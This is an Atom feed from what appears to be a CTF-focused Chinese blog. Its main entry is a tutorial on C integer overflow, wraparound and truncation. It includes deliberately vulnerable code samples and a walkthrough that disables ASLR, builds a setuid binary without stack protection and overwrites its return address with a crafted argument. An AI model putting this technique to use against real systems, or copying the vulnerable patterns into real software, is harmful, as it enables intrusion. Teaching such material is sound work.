<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>技术栈</title>
  
  <subtitle>Share station</subtitle>
  <link href="https://www.rgzzplus.com/atom.xml" rel="self"/>
  
  <link href="https://www.rgzzplus.com/"/>
  <updated>2022-08-27T04:49:22.367Z</updated>
  <id>https://www.rgzzplus.com/</id>
  
  <author>
    <name>rgzzplus</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>整数安全</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    <id>https://www.rgzzplus.com/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/</id>
    <published>2022-08-27T04:48:59.000Z</published>
    <updated>2022-08-27T04:49:22.367Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-什么是整数溢出"><a class="markdownIt-Anchor" href="#1-什么是整数溢出"></a> 1. 什么是整数溢出</h2><h3 id="11-简介"><a class="markdownIt-Anchor" href="#11-简介"></a> 1.1 简介</h3><p>在 C 语言基础的章节中，我们介绍了 C 语言整数的基础知识，下面我们详细介绍整数的安全问题。</p><p>由于整数在内存里面保存在一个固定长度的空间内，它能存储的最大值和最小值是固定的，如果我们尝试去存储一个数，而这个数又大于这个固定的最大值时，就会导致整数溢出。（x86-32 的数据模型是 ILP32，即整数（Int）、长整数（Long）和指针（Pointer）都是 32 位。）</p><h3 id="12-整数溢出的危害"><a class="markdownIt-Anchor" href="#12-整数溢出的危害"></a> 1.2 整数溢出的危害</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出出现之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p><h2 id="2-整数溢出"><a class="markdownIt-Anchor" href="#2-整数溢出"></a> 2. 整数溢出</h2><p>关于整数的异常情况主要有三种：</p><ul><li>溢出<ul><li>只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出</li><li>溢出标志 <code>OF</code> 可检测有符号数的溢出</li></ul></li><li>回绕<ul><li>无符号数 <code>0-1</code> 时会变成最大的数，如 1 字节的无符号数会变为 <code>255</code>，而 <code>255+1</code> 会变成最小数 <code>0</code>。</li><li>进位标志 <code>CF</code> 可检测无符号数的回绕</li></ul></li><li>截断<ul><li>将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</li></ul></li></ul><h3 id="21-有符号整数溢出"><a class="markdownIt-Anchor" href="#21-有符号整数溢出"></a> 2.1 有符号整数溢出</h3><ul><li>上溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line">i = INT_MAX;  <span class="comment">// 2 147 483 647</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);  <span class="comment">// i = -2 147 483 648</span></span><br></pre></td></tr></table></figure><ul><li>下溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = INT_MIN;  <span class="comment">// -2 147 483 648</span></span><br><span class="line">i--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);  <span class="comment">// i = 2 147 483 647</span></span><br></pre></td></tr></table></figure><h3 id="22-无符号数回绕"><a class="markdownIt-Anchor" href="#22-无符号数回绕"></a> 2.2 无符号数回绕</h3><p>涉及无符号数的计算永远不会溢出，因为不能用结果为无符号整数表示的结果值被该类型可以表示的最大值加 1 之和取模减（reduced modulo）。因为回绕，一个无符号整数表达式永远无法求出小于零的值。</p><p>使用下图直观地理解回绕，在轮上按顺时针方向将值递增产生的值紧挨着它：</p><p><img src="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/1.5.1_unsigned_integer.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ui;</span><br><span class="line">ui = UINT_MAX;  <span class="comment">// 在 x86-32 上为 4 294 967 295</span></span><br><span class="line">ui++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ui = %u\n&quot;</span>, ui);  <span class="comment">// ui = 0</span></span><br><span class="line">ui = <span class="number">0</span>;</span><br><span class="line">ui--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ui = %u\n&quot;</span>, ui);  <span class="comment">// 在 x86-32 上，ui = 4 294 967 295</span></span><br></pre></td></tr></table></figure><h3 id="23-截断"><a class="markdownIt-Anchor" href="#23-截断"></a> 2.3 截断</h3><ul><li>加法截断：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff + 0x00000001</span><br><span class="line">= 0x0000000100000000 (long long)</span><br><span class="line">= 0x00000000 (long)</span><br></pre></td></tr></table></figure><ul><li>乘法截断：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00123456 * 0x00654321</span><br><span class="line">= 0x000007336BF94116 (long long)</span><br><span class="line">= 0x6BF94116 (long)</span><br></pre></td></tr></table></figure><h3 id="24-整型提升和宽度溢出"><a class="markdownIt-Anchor" href="#24-整型提升和宽度溢出"></a> 2.4 整型提升和宽度溢出</h3><p>整型提升是指当计算表达式中包含了不同宽度的操作数时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> l;  </span><br><span class="line">    <span class="type">short</span> s;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    l = <span class="number">0xabcddcba</span>;</span><br><span class="line">    s = l;</span><br><span class="line">    c = l;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;宽度溢出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;l = 0x%x (%d bits)\n&quot;</span>, l, <span class="keyword">sizeof</span>(l) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s = 0x%x (%d bits)\n&quot;</span>, s, <span class="keyword">sizeof</span>(s) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = 0x%x (%d bits)\n&quot;</span>, c, <span class="keyword">sizeof</span>(c) * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整型提升\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s + c = 0x%x (%d bits)\n&quot;</span>, s+c, <span class="keyword">sizeof</span>(s+c) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./a.out</span></span><br><span class="line">宽度溢出</span><br><span class="line">l = 0xabcddcba (32 bits)</span><br><span class="line">s = 0xffffdcba (16 bits)</span><br><span class="line">c = 0xffffffba (8 bits)</span><br><span class="line">整型提升</span><br><span class="line">s + c = 0xffffdc74 (32 bits)</span><br></pre></td></tr></table></figure><p>使用 gdb 查看反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x10</span><br><span class="line">   0x0000000000001175 &lt;+12&gt;:mov    DWORD PTR [rbp-0x4],0xabcddcba</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x000000000000117f &lt;+22&gt;:mov    WORD PTR [rbp-0x6],ax</span><br><span class="line">   0x0000000000001183 &lt;+26&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:mov    BYTE PTR [rbp-0x7],al</span><br><span class="line">   0x0000000000001189 &lt;+32&gt;:lea    rdi,[rip+0xe74]        # 0x2004</span><br><span class="line">   0x0000000000001190 &lt;+39&gt;:call   0x1060 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x0000000000001198 &lt;+47&gt;:mov    edx,0x20</span><br><span class="line">   0x000000000000119d &lt;+52&gt;:mov    esi,eax</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:lea    rdi,[rip+0xe6b]        # 0x2011</span><br><span class="line">   0x00000000000011a6 &lt;+61&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011ab &lt;+66&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011b0 &lt;+71&gt;:movsx  eax,WORD PTR [rbp-0x6]</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:mov    edx,0x10</span><br><span class="line">   0x00000000000011b9 &lt;+80&gt;:mov    esi,eax</span><br><span class="line">   0x00000000000011bb &lt;+82&gt;:lea    rdi,[rip+0xe63]        # 0x2025</span><br><span class="line">   0x00000000000011c2 &lt;+89&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011c7 &lt;+94&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011cc &lt;+99&gt;:movsx  eax,BYTE PTR [rbp-0x7]</span><br><span class="line">   0x00000000000011d0 &lt;+103&gt;:mov    edx,0x8</span><br><span class="line">   0x00000000000011d5 &lt;+108&gt;:mov    esi,eax</span><br><span class="line">   0x00000000000011d7 &lt;+110&gt;:lea    rdi,[rip+0xe5b]        # 0x2039</span><br><span class="line">   0x00000000000011de &lt;+117&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011e3 &lt;+122&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011e8 &lt;+127&gt;:lea    rdi,[rip+0xe5e]        # 0x204d</span><br><span class="line">   0x00000000000011ef &lt;+134&gt;:call   0x1060 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011f4 &lt;+139&gt;:movsx  edx,WORD PTR [rbp-0x6]</span><br><span class="line">   0x00000000000011f8 &lt;+143&gt;:movsx  eax,BYTE PTR [rbp-0x7]</span><br><span class="line">   0x00000000000011fc &lt;+147&gt;:add    eax,edx</span><br><span class="line">   0x00000000000011fe &lt;+149&gt;:mov    edx,0x20</span><br><span class="line">   0x0000000000001203 &lt;+154&gt;:mov    esi,eax</span><br><span class="line">   0x0000000000001205 &lt;+156&gt;:lea    rdi,[rip+0xe4e]        # 0x205a</span><br><span class="line">   0x000000000000120c &lt;+163&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000001211 &lt;+168&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x0000000000001216 &lt;+173&gt;:nop</span><br><span class="line">   0x0000000000001217 &lt;+174&gt;:leave  </span><br><span class="line">   0x0000000000001218 &lt;+175&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在整数转换的过程中，有可能导致下面的错误：</p><ul><li>损失值：转换为值的大小不能表示的一种类型</li><li>损失符号：从有符号类型转换为无符号类型，导致损失符号</li></ul><h3 id="25-漏洞多发函数"><a class="markdownIt-Anchor" href="#25-漏洞多发函数"></a> 2.5 漏洞多发函数</h3><p>我们说过整数溢出要配合上其他类型的缺陷才能有用，下面的两个函数都有一个 <code>size_t</code> 类型的参数，常常被误用而产生整数溢出，接着就可能导致缓冲区溢出漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><p><code>memcpy()</code> 函数将 <code>src</code> 所指向的字符串中以 <code>src</code> 地址开始的前 <code>n</code> 个字节复制到 <code>dest</code> 所指的数组中，并返回 <code>dest</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src, <span class="type">size_t</span> n)</span>;</span><br></pre></td></tr></table></figure><p><code>strncpy()</code> 函数从源 <code>src</code> 所指的内存地址的起始位置开始复制 <code>n</code> 个字节到目标 <code>dest</code> 所指的内存地址的起始位置中。</p><p>两个函数中都有一个类型为 <code>size_t</code> 的参数，它是无符号整型的 <code>sizeof</code> 运算符的结果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="type">size_t</span>;</span><br></pre></td></tr></table></figure><h2 id="3-整数溢出示例"><a class="markdownIt-Anchor" href="#3-整数溢出示例"></a> 3. 整数溢出示例</h2><p>现在我们已经知道了整数溢出的原理和主要形式，下面我们先看几个简单示例，然后实际操作利用一个整数溢出漏洞。</p><h3 id="31-示例"><a class="markdownIt-Anchor" href="#31-示例"></a> 3.1 示例</h3><p>示例一，整数转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = read_int_from_network();</span><br><span class="line">    <span class="type">char</span> *p = read_string_from_network();</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">80</span>) &#123;</span><br><span class="line">        error(<span class="string">&quot;length too large: bad dog, no cookie for you!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, p, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子的问题在于，如果攻击者给 <code>len</code> 赋于了一个负数，则可以绕过 <code>if</code> 语句的检测，而执行到 <code>memcpy()</code> 的时候，由于第三个参数是 <code>size_t</code> 类型，负数 <code>len</code> 会被转换为一个无符号整型，它可能是一个非常大的正数，从而复制了大量的内容到 <code>buf</code> 中，引发了缓冲区溢出。</p><p>示例二，回绕和溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="comment">// int len;</span></span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line"></span><br><span class="line">    len = read_int_from_network();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len + <span class="number">5</span>);</span><br><span class="line">    read(fd, buf, len);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子看似避开了缓冲区溢出的问题，但是如果 <code>len</code> 过大，<code>len+5</code> 有可能发生回绕。比如说，在 x86-32 上，如果 <code>len = 0xFFFFFFFF</code>，则 <code>len+5 = 0x00000004</code>，这时 <code>malloc()</code> 只分配了 4 字节的内存区域，然后在里面写入大量的数据，缓冲区溢出也就发生了。（如果将 <code>len</code> 声明为有符号 <code>int</code> 类型，<code>len+5</code> 可能发生溢出）</p><p>示例三，截断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">    total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">strcat</span>(buf, argv[<span class="number">2</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子接受两个字符串类型的参数并计算它们的总长度，程序分配足够的内存来存储拼接后的字符串。首先将第一个字符串参数复制到缓冲区中，然后将第二个参数连接到尾部。如果攻击者提供的两个字符串总长度无法用 <code>total</code> 表示，则会发生截断，从而导致后面的缓冲区溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序中 <code>strlen()</code> 返回类型是 <code>size_t</code>，却被存储在无符号字符串类型中，任意超过无符号字符串最大上限值（256 字节）的数据都会导致截断异常。当密码长度为 261 时，截断后值变为 5，成功绕过了 <code>if</code> 的判断，导致栈溢出。下面我们利用溢出漏洞来获得 shell。</p><p>编译命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0&gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chown</span> root vuln</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chgrp</span> root vuln</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">sudo <span class="built_in">chmod</span> +s vuln</span></span><br></pre></td></tr></table></figure><p>使用 gdb 反汇编 <code>validate_passwd</code> 函数。<mark>rdi,rsi,rdx,rcx,r8,r9</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble validate_passwd</span><br><span class="line">Dump of assembler code for function validate_passwd:</span><br><span class="line">   0x0000000000001189 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x000000000000118d &lt;+4&gt;:push   rbp; 压入ebp</span><br><span class="line">   0x000000000000118e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001191 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   0x0000000000001195 &lt;+12&gt;:mov    QWORD PTR [rbp-0x18],rdi</span><br><span class="line">   0x0000000000001199 &lt;+16&gt;:mov    rax,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x000000000000119d &lt;+20&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000000011a0 &lt;+23&gt;:call   0x1090 &lt;strlen@plt&gt;</span><br><span class="line">   0x00000000000011a5 &lt;+28&gt;:mov    BYTE PTR [rbp-0x1],al; 将len存入[rbp-0x1]</span><br><span class="line">   0x00000000000011a8 &lt;+31&gt;:cmp    BYTE PTR [rbp-0x1],0x3</span><br><span class="line">   0x00000000000011ac &lt;+35&gt;:jbe    0x11d5 &lt;validate_passwd+76&gt;</span><br><span class="line">   0x00000000000011ae &lt;+37&gt;:cmp    BYTE PTR [rbp-0x1],0x8</span><br><span class="line">   0x00000000000011b2 &lt;+41&gt;:ja     0x11d5 &lt;validate_passwd+76&gt;</span><br><span class="line">   0x00000000000011b4 &lt;+43&gt;:lea    rdi,[rip+0xe49]        # 0x2004</span><br><span class="line">   0x00000000000011bb &lt;+50&gt;:call   0x1080 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011c0 &lt;+55&gt;:mov    rdx,QWORD PTR [rbp-0x18]</span><br><span class="line">   0x00000000000011c4 &lt;+59&gt;:lea    rax,[rbp-0xc]; 取passwd_buf地址</span><br><span class="line">   0x00000000000011c8 &lt;+63&gt;:mov    rsi,rdx; 传入参数passwd_buf</span><br><span class="line">   0x00000000000011cb &lt;+66&gt;:mov    rdi,rax</span><br><span class="line">   0x00000000000011ce &lt;+69&gt;:call   0x1070 &lt;strcpy@plt&gt;</span><br><span class="line">   0x00000000000011d3 &lt;+74&gt;:jmp    0x11e2 &lt;validate_passwd+89&gt;</span><br><span class="line">   0x00000000000011d5 &lt;+76&gt;:lea    rdi,[rip+0xe2e]        # 0x200a</span><br><span class="line">   0x00000000000011dc &lt;+83&gt;:call   0x1080 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011e1 &lt;+88&gt;:nop</span><br><span class="line">   0x00000000000011e2 &lt;+89&gt;:nop</span><br><span class="line">   0x00000000000011e3 &lt;+90&gt;:leave  </span><br><span class="line">   0x00000000000011e4 &lt;+91&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>通过阅读反汇编代码，我们知道缓冲区 <code>passwd_buf</code> 位于 <code>rbp-0xc</code> 的位置（<code>0x00000000000011c4&lt;+71&gt;: lea eax,[rbp-0xc]</code>），而返回地址在 <code>rbp+8</code> 的位置，所以返回地址相对于缓冲区 <code>0x14</code> 的位置。我们测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef$ r `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`</span><br><span class="line">Starting program: /home/sakura/文档/vuln `python2 -c &#x27;print &quot;A&quot;*20 + &quot;B&quot;*8 + &quot;C&quot;*233&#x27;`</span><br><span class="line">good!</span><br></pre></td></tr></table></figure><p><img src="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/image-20220810163653885.png" alt="image-20220810163653885"></p><p>可以看到 <code>EIP</code> 被 <code>BBBBBBBB</code> 覆盖，相当于我们获得了返回地址的控制权。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-什么是整数溢出&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是整数溢出&quot;&gt;&lt;/a&gt; 1. 什么是整数溢出&lt;/h2&gt;
&lt;h3 id=&quot;11-简介&quot;&gt;&lt;a class=&quot;markdownIt-Anch</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="整数安全" scheme="https://www.rgzzplus.com/tags/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出x86_64</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/"/>
    <id>https://www.rgzzplus.com/2022/08/27/%E6%A0%88%E6%BA%A2%E5%87%BAx86-64/</id>
    <published>2022-08-27T04:45:51.000Z</published>
    <updated>2022-08-27T04:47:22.175Z</updated>
    
